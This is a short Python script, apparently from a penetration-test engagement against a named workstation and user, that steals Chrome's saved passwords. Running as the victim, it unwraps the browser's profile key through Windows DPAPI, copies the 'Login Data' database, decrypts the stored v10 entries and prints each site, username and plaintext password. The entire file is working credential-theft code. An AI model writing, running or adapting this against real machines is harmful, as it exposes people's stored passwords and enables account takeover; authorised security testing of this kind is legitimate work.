#!/usr/bin/env python3
# =============================================================================
# M3.2 — Chrome saved-credential recovery  [VALIDATED]
# Runs ON AREUBEN-WS AS reuben (so native DPAPI unwraps his profile AES key) and
# decrypts the v10 logins in Chrome's "Login Data" — exactly what SharpChrome does.
# App-Bound Encryption is disabled on this host, so the profile key is the classic
# DPAPI-wrapped AES key.  Deps: pycryptodome (DPAPI + sqlite are stdlib).
# =============================================================================
import base64, ctypes, ctypes.wintypes as wt, json, os, shutil, sqlite3
try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

BASE = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
LS = os.path.join(BASE, "Local State")
DB = os.path.join(BASE, "Default", "Login Data")

class BLOB(ctypes.Structure):
    _fields_ = [("cb", wt.DWORD), ("pb", ctypes.POINTER(ctypes.c_char))]

def dpapi(buf):
    bi = BLOB(len(buf), ctypes.cast(ctypes.c_char_p(buf), ctypes.POINTER(ctypes.c_char)))
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
        raise ctypes.WinError()
    return ctypes.string_at(bo.pb, bo.cb)

key = dpapi(base64.b64decode(json.load(open(LS, encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:])
tmp = DB + ".op"
shutil.copy2(DB, tmp)
rows = sqlite3.connect(tmp).execute(
    "SELECT origin_url, username_value, password_value FROM logins").fetchall()
os.remove(tmp)
print("whoami:", os.environ.get("USERNAME"))
for url, user, pw in rows:
    if pw[:3] == b"v10":
        clear = AES.new(key, AES.MODE_GCM, nonce=pw[3:15]).decrypt(pw[15:-16]).decode("utf-8", "replace")
        print("URL=%s  USER=%s  PASS=%s" % (url, user, clear))
